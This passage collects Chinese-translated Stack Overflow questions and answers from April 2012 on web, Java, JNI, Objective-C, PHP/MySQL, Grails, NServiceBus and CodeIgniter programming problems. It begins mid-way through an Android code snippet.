        int iAvgCycleLength = CycleManager.getSingletonObject().getAvgCycleTime();

        calInstance.setTime(dtStart);
        calInstance.add(Calendar.DATE, iAvgCycleLength);            
        Date dtNextCycleDate = calInstance.getTime();   

        Long noOfDaysLeft = dtNextCycleDate.getTime()- currentDate.getTime();
        noOfDaysLeft = ((noOfDaysLeft / (1000 * 60 * 60)) + 1) / 24;

        remoteViews.setTextViewText(R.id.txt_date, Long.toString(noOfDaysLeft));        
    }
} 
```

# javascript - Nivoslider（在动态 ajax 内容中）在首次加载时不加载图像

> ID：10347249
> 
> 赞同：4
> 
> 时间：2012-04-27T08:24:25.843
> 
> 标签：javascript, jquery, html, ajax, nivo-slider

我正在开发一个网站（jQuery + Ajax），我偶然发现了一个问题。当页面动态加载时（第一次，图像尚未缓存），它不会显示图像。当我回想起ajax加载功能时，突然我的图片在那里。

```
$("#overlayInner").load(source+" #loader",function() {
     $('#workImgs').nivoSlider();
}); 
```

我在加载器 div 之外的动态页面上调用 nivoSlider，因此直接到达此页面的人也可以看到图像。

```
<script type="text/javascript">
   $(function(){
     $('#workImgs').nivoSlider();
   });
</script> 
```

当您尝试在没有 Ajax 的情况下加载页面时，图像会按应有的方式加载。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:26:22.493

很难在您的网站上进行实验 :) 但您可以尝试在每个加载页面（4d.html、dokerpoot.html 和 vuylsteke.html）中添加图像预加载代码（在`body`标记的开头）。我使用了来自 vuylsteke.html 的示例图片：

```
<script type="text/javascript">
var images = [
    'images/work/kapsalon2.jpg',
    'images/work/kapsalon3.jpg',
    'images/work/kapsalon4.jpg'
];

$(images).each(function() {
    $('<img/>')[0].src = this;
});
</script> 
```

由于fragment load函数在`get`解析返回的文档后会找到ID为container的元素，所以思路是让它先将这些图片加载到内存中，然后开始解析文档，最后初始化Nivoslider。可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:46:55.543

我遇到了从数据库加载内容的问题。事实证明，这是由未设置宽度或高度的图像引起的。这意味着插件不知道图像的大小并且没有显示它们，但是浏览器在重新加载后计算了这些属性，因此它第二次显示。

设置宽度和高度解决了这个问题。

# ajax - 使用 Ajax 自动刷新页面

> ID：10347252
> 
> 赞同：1
> 
> 时间：2012-04-27T08:24:33.183
> 
> 标签：ajax, jsp

我有一个显示队列数据的 jsp 页面。我希望新数据进入队列时自动显示，不必再次重新加载页面。

这可以通过ajax实现吗？任何示例或教程..

谢谢，

# json - 如何使用 Struts2 从 jsp 中的 JSONObject 获取属性？

> ID：10347254
> 
> 赞同：0
> 
> 时间：2012-04-27T08:24:36.593
> 
> 标签：json, jsp, struts2

我有以下情况：

```
 <s:iterator var="doc" value="docList">
    <tr>
       <td class="lastm">${doc.get("attribute")}</td>
    </tr>
  </s:iterator> 
```

`docList`是 JSONObjects 的 ArrayList。

当我加载我的页面时，我收到以下错误：

> 当未指定默认命名空间时，函数 get 必须与前缀一起使用

我也试过做
`<td class="lastm">${doc.attribute}</td>`

但后来我收到以下错误：

> 在 org.json.JSONObject 类型上找不到属性“属性”

我究竟做错了什么？ArrayList 最初是从包含较小“文档”的较大 JSONObject 构建的，但我需要一个 Iterable 对象来构建我的表。有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:06:17.697

我找到了解决方案。

而不是使用

```
<s:iterator var="doc" value="docList">
   <tr>
      <td class="lastm">${doc.get("attribute")}</td>
   </tr>
</s:iterator> 
```

我可以

```
<s:iterator var="doc" value="docList">
   <tr>
      <td class="lastm"><s:property value="#doc.get('attribute')"/></td>
   </tr>
</s:iterator> 
```

看起来它有效！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:08:50.580

`<s:property value="attribute"/>`也应该工作。

# php - 如何仅在特定日期范围内获取 Google 日历事件

> ID：10347255
> 
> 赞同：2
> 
> 时间：2012-04-27T08:24:40.977
> 
> 标签：php, google-api, google-calendar-api

我正在使用 OAuth 对 Google 日历和 PHP 客户端库进行身份验证，使用下面的示例，我能够从“主”日历中获取所有事件。有没有办法指定日期范围，例如，我只想获取将来会出现的事件。

```
$events = $service->events->listEvents('primary');

while(true) {
  foreach ($events->getItems() as $event) {
    echo $event->getSummary();
  }
  $pageToken = $events->getNextPageToken();
  if ($pageToken) {
    $optParams = array('pageToken' => $pageToken);
    $events = $service->events->listEvents('primary', $optParams);
  } else {
    break;
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T09:37:01.270

使用这些参数进行范围过滤：

*   时间最小值
*   最大时间

请注意，时间必须使用日期格式（DateTime::ATOM）。

# javascript - HTML5本地存储JSON多个对象

> ID：10347265
> 
> 赞同：3
> 
> 时间：2012-04-27T08:25:12.553
> 
> 标签：javascript, html, local-storage

有谁知道，当我在 javascript 中执行循环时，是否可以在其中创建包含多个对象的本地存储？

目前我的代码如下所示：

```
var albums = '';
var album_list = '';

$.each(data, function(i,item){
   var name = item.name;
   albums += '<li>'+item.name+'</li>';

   var album_content = {name: item.name, uid: 1};
   var album_content = album_content+',';

   album_list += album_content;

});

var album_list = '['+album_list+']';   
localStorage.setItem("albums", JSON.stringify(album_list));
var albums_l = JSON.parse(localStorage.getItem("albums"));

$.each(albums_l, function(i,item){
   console.log(item.name);
}); 
```

但这给了我一个错误。任何人都有更好的解决方案，所以我只有一个本地存储和其中的所有数据？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T08:29:11.433

您在代码中混合了对象和字符串。您`album_content`在循环中被初始化为一个对象 ( `{name: item.name, uid: 1}`)。在下一行中，您通过附加逗号将其视为字符串。

总体使用数组来收集所有对象。使用本机对象而不是尝试以某种方式模拟它们（几乎）总是更好。

试试这个代码。

```
var albums = '';
var album_list = [];

$.each(data, function(i,item){
   var name = item.name;
   albums += '<li>'+item.name+'</li>';

   var album_content = {name: item.name, uid: 1};
   // remove that line completly
   // var album_content = album_content+',';

   album_list.push( album_content );

});

localStorage.setItem("albums", JSON.stringify( album_list ));
var albums_l = JSON.parse(localStorage.getItem("albums"));

$.each(albums_l, function(i,item){
   console.log(item.name);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:31:02.183

怎么了：

```
var albums = '';
var album_list = '';

$.each(data, function(i,item){
   var name = item.name;
   albums += '<li>'+item.name+'</li>';

   var album_content = {name: item.name, uid: 1};

   // at this point album_content is an object.. so it will be this string afterwards: "[object Object],"
   var album_content = album_content+',';

   album_list += album_content; //you're adding "[object Object],"

});

// album_list will now look like this: '["[object Object],[object Object],"]'
var album_list = '['+album_list+']';
localStorage.setItem("albums", JSON.stringify(album_list));
var albums_l = JSON.parse(localStorage.getItem("albums"));

$.each(albums_l, function(i,item){
   console.log(item.name);
}); 
```

如何正确操作：

```
var albums = '';
var album_list = [];

$.each(data, function(i,item){
   var name = item.name;
   albums += '<li>'+item.name+'</li>';

   var album_content = {name: item.name, uid: 1};

   album_list.push(album_content);

});

localStorage.setItem("albums", JSON.stringify(album_list));
var albums_l = $.parseJSON(localStorage.getItem("albums"));

$.each(albums_l, function(i,item){
   console.log(item.name);
}); 
```

# objective-c - 是否可以在 Objective-C 中动态实现协议？

> ID：10347266
> 
> 赞同：3
> 
> 时间：2012-04-27T08:25:15.330
> 
> 标签：objective-c, ios, dynamic, protocols

我知道我可以使用类别扩展一个类（例如框架类），但是是否可以让一个您不控制其源代码的类实现您的自定义协议之一？我不仅希望它在发送到实例时响应某些消息，而且理想情况下，希望该类的对象在查询协议时在运行时类型检查时返回 true。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-27T09:01:16.857

您可以定义一个符合协议的类别，因此您可以执行以下操作：

```
@interface UIWebView (MyGreatExtensions) <UITableViewDelegate>
@end

@implementation UIWebView (MyGreatExtensions)

- (CGFloat)tableView: (UITableView *)tableView heightForRowAtIndexPath: (NSIndexPath *)indexPath {
  return 42.0;
}

// ...

@end 
```

需要考虑的一个小边缘情况是，如果*其他人*尝试做同样的事情（例如，第三方框架也通过类别添加协议），那么您不能保证*您的*版本会被使用（当然也不能他们）。

[Mark Dalrymple](http://weblog.bignerdranch.com/?p=465)提供了更多关于这种方法的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T08:54:33.310

我认为这是可能的。您可以通过覆盖 NSObject 的 forwardInvocation: 方法轻松地在 Objective-C 中创建动态代理（这就是 NSUndoManager 的魔力），拦截协议实现者将响应的所有无法识别的消息。我自己从来没有这样做过，所以可能有一种更优雅的方式来做到这一点。

另外，为了让运行时检查同意你的对象确实实现了协议，你可以重写 NSObject 的类方法conformsToProtocol: 像这样：

```
+ (BOOL)conformsToProtocol:(Protocol *)aProtocol {
    if (aProtocol == @protocol(MyDynamicallyImplementedProtocol))
        return YES;
    return [super conformsToProtocol:aProtocol];
} 
```

您可能需要覆盖更多方法，例如 NSObject 的 instancesRespondToSelector: 和 resolve*: 方法。检查 NSObject[类参考](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsobject_Class/Reference/Reference.html)以了解更多信息。

# c# - IE 错误信息：“此网站已被报告为不安全”

> ID：10347268
> 
> 赞同：2
> 
> 时间：2012-04-27T08:25:36.383
> 
> 标签：c#, asp.net, internet-explorer-9, iis-7.5, internet-explorer-10

我用 C# asp.net 编写了一个站点，并且正在运行 IIS7.5。

网站与 IE9 和 IE10 以外的其他浏览器完美配合。在这些浏览器中，我收到此错误消息：

[http://imageshack.us/photo/my-images/16/unsafefilterss.png/](http://imageshack.us/photo/my-images/16/unsafefilterss.png/)

该网站是[http://filterss.net](http://filterss.net)

我有点不知所措，我真的不知道我需要在编程中进行哪些更改才能使此警告消失。任何人都有这个错误的经验？

显而易见的问题是：“我是否在我的网站上编写了 inn 恶意软件？”，不，我没有。我的程序可以被利用吗？好吧，是的，我会这么认为，因为没有 100% 安全的编码方式。

那么出现此消息是否有任何具体原因？我可以在我的代码中更改任何内容以使其消失吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:32:12.113

目前我唯一能想到的是你的元关键字标签中有种子

# java - JNI 调用时出现 UnsatisfiedLinkError

> ID：10347269
> 
> 赞同：2
> 
> 时间：2012-04-27T08:25:40.757
> 
> 标签：java, c++, dll, java-native-interface, unsatisfiedlinkerror

我已经发现了很多关于 UnsatisfiedLinkError 与 JNI 结合的事情和问题，但没有一个可以帮助我。我正在尝试使用 Java 隐藏一个窗口，所以我需要 3 个 WinAPI 函数。

我有以下 Java 源代码：

```
package hide.window;
public class HideWindow {

    public native static int hideWindow(char[] windowTitle);

    static {
        System.loadLibrary("hideWindow");
    }

    public static void main(String[] args) {
        System.out.println("loadLibrary was successful");
        System.out.println(hideWindow("Session Window - Windows Internet Explorer".toCharArray()));
    }
} 
```

然后我有 javah 生成的 hide_window_HideWindow.h。我必须更改一件事，因为它没有在库路径中找到 jni.h 文件，所以我只是将它放入我的项目中并以下列方式包含它：

```
#include "jni.h" 
```

**这可能会导致我的错误吗？** 整个文件：

```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include "jni.h"
/* Header for class hide_window_HideWindow */

#ifndef _Included_hide_window_HideWindow
#define _Included_hide_window_HideWindow
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     hide_window_HideWindow
 * Method:    hideWindow
 * Signature: ([C)I
 */
JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow
  (JNIEnv *, jobject, jcharArray);

#ifdef __cplusplus
}
#endif
#endif 
```

我编译到我的 DLL 中的代码如下所示：

```
#include <windows.h>
#include "hide_window_HideWindow.h"
using namespace std;

JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow(char windowTitle[20])
{
    HWND windowHandle = FindWindowA(NULL, windowTitle);
    if (windowHandle){
        if (IsWindowVisible(windowHandle)){
            ShowWindow(windowHandle, 0);
            return 0;
        }
        else{
            ShowWindow(windowHandle, 1);
            return 1;
        }
    }
    return -1;
} 
```

来自 eclipse 的调用和通过 cmd 进行的以下调用没有区别（路径正确）：

```
java -Djava.library.path=.. hide.window.HideWindow 
```

结果输出如下所示：

> ```
> loadLibrary was successful
> Exception in thread "main" java.lang.UnsatisfiedLinkError: hide.window.HideWindow.hideWindow([C)I
>   at hide.window.HideWindow.hideWindow(Native Method)
>   at hide.window.HideWindow.main(HideWindow.java:12) 
> ```

这表明 Java 程序能够加载 DLL，但在函数调用时失败。我将 Eclipse 用作 Java，将 Codeblocks 用作 C++ IDE，并且我已经在 mingw 构建选项中添加了以下内容。

```
-Wl,--kill-at 
```

我希望这个问题不是太愚蠢，提前谢谢你，汤姆

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T08:50:05.143

看原型：

```
JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow
    (JNIEnv *, jobject, jcharArray); 
```

和你的实施：

```
JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow
    (char windowTitle[20]) 
```

当然有一个`UnsatisfiedLinkError`因为你没有实现正确的功能。

所以你需要类似的东西：

```
JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow
    (JNIEnv* env, jobject thiz, jcharArray windowTitle) 
```

要从数组中取出字符，请查看`GetPrimitiveArrayCritial`or `GetCharArrayRegion`。

生成的标头在我看来也很可疑，因为您将 Java 方法定义为`static`但生成的原型想要传递一个`jobject`... 静态方法需要`jclass`（因为没有用于静态方法调用的实例对象）：

```
JNIEXPORT jint JNICALL Java_hide_window_HideWindow_hideWindow
    (JNIEnv* env, jclass clazz, jcharArray windowTitle) 
```

另一件事：Java 的`char`( `jchar`) 是`unsigned int16`，C/C++`char`是有符号或无符号`int8`的。所以最好传递一个`String`( `jstring`) 并使用`GetStringUTFChars`.

# ajax - Grails formRemote

> ID：10347273
> 
> 赞同：2
> 
> 时间：2012-04-27T08:26:03.137
> 
> 标签：ajax, grails, form-submit

我有 DateFrom 和 DateTo 字段。我想将这些数据提交给执行一些业务逻辑的操作，但原始 GSP 没有任何变化，也没有任何更新。我该如何管理？我试过这个：

```
<g:formRemote name="formName" url="[action: 'myAction']"> 
```

一切都很好，但除了我的操作尝试渲染 myAction.jsp。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:44:03.900

[这](http://grails.org/doc/latest/ref/Tags/formRemote.html)是阅读其工作原理的好地方。

基本上你还需要指定什么控制器：

```
<g:formRemote name="formName" update="updateMe" url="[controller: 'controller', action:'myAction']"> 
```

“updateMe”是一个 html 对象的 id，最好是 div，您希望在提交后更改它（但这不是强制性的）。它还使用 actionName.gsp 来“提供”答案，这就是您需要创建此页面的原因。

远程表单一开始有点棘手，但是一旦你掌握了它，它们就会超级简单！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:38:24.047

我是这样做的：

普惠制：

```
<g:formRemote name="formName" update="updateMe" url="[controller: 'controller', action:'myAction']">
<div id="updateMe">
    <g:render template="updateTemplate"/>
</div> 
```

行动：

```
...
render template:"updateTemplate" 
```

updateTemplate 和 updateMe div 都是空的。

如果您有更好的解决方案，请告诉我。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-28T07:38:58.440

你可以使用[remoteFunction](http://grails.org/doc/2.0.1/ref/Tags/remoteFunction.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T12:38:23.760

您需要在表单中编写提交按钮，然后在它触发操作并将一些更改显示到 div 之后。

# bash - 如何在 Linux 系统上将多个二进制文件复制到一个文件中？

> ID：10347278
> 
> 赞同：63
> 
> 时间：2012-04-27T08:26:35.240
> 
> 标签：bash, binary, copy

我需要将包含二进制文件的文件夹的内容复制到另一个目录中的一个二进制文件中。

在 Windows 中，我可以使用：

```
copy file1 + file2 targetfile /B 
```

我在 Linux 上找不到类似的东西（我看到了一种使用 的方法`cat`，但我不确定这是否真的适用于二进制文件）。

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2012-04-27T08:28:21.793

Unix 没有区分文本文件和二进制文件，这就是为什么你可以`cat`把它们放在一起：

```
cat file1 file2 > target_file 
```

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-04-27T08:29:16.483

`cat`是一个非常有用的实用程序，它将一个或多个文件的内容输出到标准输出。可以使用 shell 功能将其重定向到文件中。它适用于二进制或 ascii 文件。在一些不使用链接的编程语言中，cat 用于将二进制文件合并为单个可执行文件。

```
cat file1 file2 > target_file 
```

# windows - 将文件从一个 Windows 服务器复制到另一个

> ID：10347279
> 
> 赞同：2
> 
> 时间：2012-04-27T08:26:37.333
> 
> 标签：windows, wmi, powershell-remoting, microsoft-bits

我必须将文件从 Windows 2008 服务器复制到一个或多个 Windows 2008 服务器。我在目标机器上拥有足够权限的帐户，可以让我使用 powershell 远程处理和 wmi。远程机器不运行 ftp、ssh 或类似的文件传输机制。我不允许在目标服务器上安装软件或运行新服务。我可以在源服务器上运行服务。

文件复制操作必须从源服务器启动。即，我无法手动登录到目标机器并启动复制——尽管可以使用自动方式来执行此操作。

是否可以使用 WMI 或 PowerShell Remoting 将文件从源推送或拉到目标？是否可以调用某种内置的 http 客户端或调用远程服务器上的 BITS 服务/代理以从源服务器中提取文件？

请提出其他建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-28T04:57:46.867

是的，可以使用给定的约束来复制文件。基本上，您需要确保源服务器具有目标主机可访问的文件共享。然后，您将需要遵循 Frank White 在此处创建的过程，并在此处完全充实和引用，尽管您必须从 VBS 转换为 PS1： [尝试使用 WMI 将文件从一台 XP PC 复制到另一台，因为 RPC 和 UNC 不可用](https://stackoverflow.com/questions/11769129/trying-to-copy-file-from-one-xp-pc-to-another-using-wmi-since-rpc-and-unc-are-n)

# c# - FileSystemWatcher 监控目录大小

> ID：10347283
> 
> 赞同：2
> 
> 时间：2012-04-27T08:26:53.680
> 
> 标签：c#, windows-services, filesystemwatcher

您好我正在创建一个 Windows 服务来监视某些目录，以查看目录的大小是否已达到其限制。我创建了一个文件系统观察程序，如下所示：

```
 FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = dirPaths[i].ToString();
            watcher.NotifyFilter = NotifyFilters.Size;
            watcher.EnableRaisingEvents = true;
            watcher.Changed += new FileSystemEventHandler(OnChanged); 
```

和

```
 private void OnChanged(object source, FileSystemEventArgs e)
    {
        try
        {

        string directory = new DirectoryInfo(e.FullPath).Parent.FullName;//gettting the directory path from the full path

        float dirSize = CalculateFolderSize(directory);

        float limitSize = int.Parse(_config.TargetSize);//getting the limit size 

        if (dirSize > limitSize)
        {
            eventLogCheck.WriteEntry("the following path has crossed the limit " + directory);
            //TODO: mail sending
        }
    }
    catch (Exception ex)
    {
        eventLogCheck.WriteEntry(ex.ToString());
    }

} 
```

`CalculateFolderSize`检查驱动器中所有文件和子目录的大小。

现在，当我将文件添加到目录（例如 .xls、.txt 等文件）时，这可以正常工作，但是如果我将文件夹添加到目录，它不会触发`OnChanged`事件？

如果我启用：

```
watcher.IncludeSubdirectories = true; 
```

它确实触发了`Onchanged`事件，但在这种情况下，它只检查子目录而不是整个目录。

请有人告诉我如何使它工作，以便当我将文件夹复制到正在监视的目录时，它会触发`Onchanged`事件并计算目录的新大小。

如果这有帮助，我的`CalculateFolderSize`功能如下：

```
//function to calculate the size of the given path
        private float CalculateFolderSize(string folder)
        {
            float folderSize = 0.0f;
            try
            {
                //Checks if the path is valid or not         
                if (!Directory.Exists(folder))
                {
                    return folderSize;
                }
                else
                {
                    try
                    {
                        foreach (string file in Directory.GetFiles(folder))
                        {
                            if (File.Exists(file))
                            {
                                FileInfo finfo = new FileInfo(file);
                                folderSize += finfo.Length;
                            }
                        }
                        foreach (string dir in Directory.GetDirectories(folder))
                        {
                            folderSize += CalculateFolderSize(dir);
                        }
                    }
                    catch (NotSupportedException ex)
                    {
                        eventLogCheck.WriteEntry(ex.ToString());
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                eventLogCheck.WriteEntry(ex.ToString());
            }
            return folderSize;
        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T08:35:07.740

您正在使用由 提供的文件夹路径，`FileSystemEventArgs`这将是已更改的文件夹。相反，为您正在监视的每个目录根创建一个对象，并在其中存储根路径并使用它而不是`EventArgs`.

您可能会发现创建此对象的一种简单方法就是对事件处理程序使用 lambda 函数，如下所示。这有效地将外部范围的路径包装到您正在监视的每个路径的不同对象中。

```
 FileSystemWatcher watcher = new FileSystemWatcher();
 watcher.Path = dirPaths[i].ToString();
 watcher.NotifyFilter = NotifyFilters.Size;
 watcher.EnableRaisingEvents = true;
 watcher.Changed += delegate (object source, FileSystemEventArgs e)
 {
    float dirSize = CalculateFolderSize(watcher.Path); // using the path from the outer scope

    float limitSize = int.Parse(_config.TargetSize);//getting the limit size 

    if (dirSize > limitSize)
    {
        eventLogCheck.WriteEntry("the folloing path has crossed the limit " + directory);
        //TODO: mail sending
    }
 }; 
```

# php - 使用 POST 方法来反映记录

> ID：10347284
> 
> 赞同：0
> 
> 时间：2012-04-27T08:26:55.477
> 
> 标签：php, mysql, post, database-connectivity

我正在尝试使用 PHP 反映 MySQL 数据库中的记录。代码是这样的（数据库已连接并选择）

Query.php -> 此文件反映数据库中选择框中的**不同类别**（因为我有多个类别值）

```
<form action="process.php" method="post">
<select name="cat">
<?php
$sql="select distinct Category from tbl_1 order by Category asc";
$query=mysql_query($sql);

while($row=mysql_fetch_array($query))
{

echo "<option value=$row[Name]>$row[Category]</option>";
}
?>
</select>
<input name="" type="submit" />
</form> 
```

process.php-> 该文件采用用户在 query.php 中选择的选项，并相应地反映名称和地区。

```
<?php

$myValue =$_POST['cat'];
echo $myValue;
$mySqlStm = "SELECT Station, Name FROM tbl_1 WHERE Category = '.$myValue.'";
$result2 = mysql_query($mySqlStm) or die("Error:mysql_error()"); 
if(mysql_num_rows($result2) == 0)
{ 
echo("<br/>No Records Found"); 
} 
ELSE 
{ 
echo "<table border='1'>"; 

//ECHO THE RECORDS FETCHED
   while($row = mysql_fetch_array($result2)) 
    { 
      echo "<tr>"; 
      echo "<td>" . $row['Station'] . "</td>"; 
      echo "<td>" . $row['Name'] . "</td>"; 

      echo "</tr>";

    }

 echo "</table>";  }

?> 
```

问题-> 在运行 query.php 时，我认为 process.php 没有收到来自 query.php 的选定选项，因此我得到“未找到记录”。我的数据库有数据。谁能告诉我这里的错误...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:36:38.257

您在这里放置`<option value=$row[Name]>$row[Category]</option>` 的价值`$row[Name]`不是`$row[Category]`并选择类别

```
$mySqlStm = "SELECT Station, Name FROM tbl_1 WHERE Category = '.$myValue.'"; 
```

尝试`$row[Category]`像这样放置选项值

```
echo "<option value=".$row[Category].">".$row[Category]."</option>"; 
```

# nservicebus - 在 NServiceBus 配置文件上

> ID：10347285
> 
> 赞同：0
> 
> 时间：2012-04-27T08:27:24.230
> 
> 标签：nservicebus

我一直在努力寻找提高 nservicebus 代码性能的方法。我搜索并偶然发现了这些配置文件，您可以在运行/安装 nservicebus 主机时设置这些配置文件。

目前我们按原样运行 nservicebus 主机，我读到默认情况下我们使用可用配置文件的“Lite”版本。我也从这个链接中了解到：

[http://docs.particular.net/nservicebus/hosting/nservicebus-host/profiles](http://docs.particular.net/nservicebus/hosting/nservicebus-host/profiles)

有集成和生产配置文件。文档并没有说太多 - 有没有人尝试过生产配置文件并注意到 nservicebus 性能的改进？特别影响从队列中消费消息的速度？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T12:51:23.150

除非您自己调整日志记录，否则我们已经看到基于减少日志记录的巨大改进。读取队列的性能是相同的。由于队列是本地的，因此您不会从运输中获得太多收益。我会看看调整你的处理程序和底层基础设施。您可能想查看调整 MSMQ 并查看您正在使用的磁盘等。另一个地方是查看分布式事务是如何工作的，假设您正在使用需要它们的远程数据库。

增加处理时间的另一个选择是增加使用队列的线程数。这将需要许可证。如果许可证不是一个选项，您可以运行单个线程端点的多个实例。这需要您根据消息类型或其他内容对您的工作进行分片。

继续扩大规模，您就可以开始使用 Distributor 来进行负载平衡工作。同样，这将需要许可证，但您可以根据需要添加更多节点。上述所有机会也适用于此拓扑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:48:33.770

NSB 配置文件之间的一个主要区别是它们如何处理订阅的存储。

lite、集成和生产配置文件允许 NSB 配置它的可靠性。例如，lite 配置文件对所有发布/订阅注册使用内存订阅存储。这是一个问题，因为为了在 lite 配置文件中注册订阅者，发布者必须已经在运行（因此发布者可以将订阅者列表存储在内存中）。这意味着如果发布者因任何原因崩溃（或脱机），所有订阅信息都会丢失（直到每个订阅者重新启动）。

因此，如果您在开发人员机器上运行并且想要快速测试您的服务如何交互，那么 lite 配置文件是很好的选择。但是，它只是不适合其他环境。

集成配置文件将订阅信息存储在本地队列中。这对于简单的环境（如 QA 等）很有用。但是，在高度分布式的环境中，将订阅信息保存在数据库中是最好的，因此是生产配置文件。

因此，为了回答您的问题，我认为通过更改配置文件您不会看到性能提升。如果有的话，从 lite 配置文件更改为其他配置文件之一可能会降低性能（因为您会产生访问队列或数据库存储的成本）。

# internet-explorer - IE 管理加载项对话框中的添加按钮

> ID：10347288
> 
> 赞同：2
> 
> 时间：2012-04-27T08:27:30.873
> 
> 标签：internet-explorer, bho, browser-addons, ieaddon

是否可以在“管理加载项”对话框中添加自定义按钮。当我的 BHO 被选中时，我想将它添加到 BHO 描述和信息字段中。

# ruby-on-rails - 从 Ruby 上的表中读取数据

> ID：10347289
> 
> 赞同：2
> 
> 时间：2012-04-27T08:27:34.073
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我刚读[了这个](https://stackoverflow.com/questions/10346140/show-data-from-table-on-ruby)问题，我也有同样的问题，但我想要更多。

```
%= puts @note.inspect %> I have this this result.

Note id: 1, user_id: 1, note_type: 0, text: "Hello", lat: 40.2290542420142, lng: 44.420879046875, deleted: false, created_at: "2012-04-26 14:10:05", updated_at: "2012-04-26 14:10:05">,

Note id: 2, user_id: 1, note_type: 0, text: "Bye", lat: nil, lng: nil, deleted: false, created_at: "2012-04-27 08:13:44", updated_at: "2012-04-27 08:13:44" 
```

我也这样做了`@note.first.text`，但在这里我只能得到一个值。但我想得到这个结果。

1.  你好世界 70.2290542420142 74.420879046875
2.  再见

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:35:53.990

它似乎`@note`是一个数组。所以尝试类似：

```
<%- for n in @note %>
<%=  n.text %>
<%=  n.lat %>
<%=  n.lng %>
<%- end %> 
```

# sql-server - 页面不显示在 codeigniter 中（连接到 sql server）

> ID：10347296
> 
> 赞同：0
> 
> 时间：2012-04-27T08:27:51.780
> 
> 标签：sql-server, codeigniter, view, controller

我开始使用 codeigniter 框架制作 web 并使用 SQL server 作为 DBMS。但是我的第一页没有显示查看内容。这个案子有什么问题？以下是 database.php 上的代码：

```
$db['default']['hostname'] = 'BRYANWVM1';
$db['default']['username'] = 'sa';
$db['default']['password'] = 'admin%%123';
$db['default']['database'] = 'ej';
$db['default']['dbdriver'] = 'mssql';
$db['default']['dbprefix'] = '';
$db['default']['pconnect'] = TRUE;
$db['default']['db_debug'] = TRUE;
$db['default']['cache_on'] = FALSE; 
```

这是控制器上的代码：

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Ej extends CI_Controller {
function __construct()
{
    parent::__construct();
    $this->load->helper(array('form','url', 'text_helper','date','file'));
    $this->load->database();
    $this->load->library();
    $this->load->plugin();
}
function index()
{
    $data=array();
    $this->load->view('electronicjournal/bg_kiri.php',$data);
}
} 
```

以下是电子期刊文件夹中视图的代码：

```
<form method="post" action="<?php echo "".base_url()."index.php/electronicjournal/login" ?>
<table style="border: 1pt ridge #DDDDDD;" bgcolor="#fee3b3" class="widget" width="230">
<tr bgcolor="#fee3b3"><td colspan="3" bgcolor="#FFCC66"><h2><img src="<?php echo base_url(); ?>system/application/views/electronicjoournal/images/login-icon.png" /> Login</h2></td></tr>
<tr bgcolor="#fee3b3"><td width="70" bgcolor="#fee3b3">Username</td><td width="5">:</td>
<td width="130" bgcolor="#fee3b3"><input name="usernameteks" type="text" class="textfield" size="16"/></td></tr>
<tr bgcolor="#fee3b3"><td width="70" bgcolor="#fee3b3">Password</td><td width="5">:</td>
<td width="130" bgcolor="#fee3b3"><input name="passwordteks" type="password" class="textfield" value="" size="16" /></td>
</tr>
<tr bgcolor="#fee3b3"><td width="70" bgcolor="#fee3b3"></td>
<td width="5"></td>
<td width="135" bgcolor="#fee3b3"><input type="submit" value="Log In" class="tombol"/><br>
<br></td></tr>
</table>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:46:09.537

问题出在这一行：

```
$this->load->view('electronicjournal/bg_kiri.php',$data); 
```

您不需要指定文件的扩展名。用这个：

```
$this->load->view('electronicjournal/bg_kiri',$data); 
```

# c++ - 初始化中的评估顺序

> ID：10347298
> 
> 赞同：2
> 
> 时间：2012-04-27T08:28:01.937
> 
> 标签：c++, c++11, initialization

valueA 和 valueB 的以下初始化是否需要未定义的行为？

```
int array[2] = {1,2};
int index = 0;
int valueA = array[index++], valueB = array[index++]; 
```

c++ 98 和 c++ 11 之间有什么变化吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T08:43:41.850

行为是明确定义的。来自 C++11 草案 n3290 §8*声明*符：

> 声明中的每个 init-declarator 都被单独分析，就好像它本身在声明中一样。

所以你的代码相当于：

```
...
int valueA = array[index++];
int valueB = array[index++]; 
```

我没有 C++98 标准，但 ISO/IEC 14882:2003（“C++03”）中存在相同的措辞。

* * *

## 回答 #2

> 赞同：0
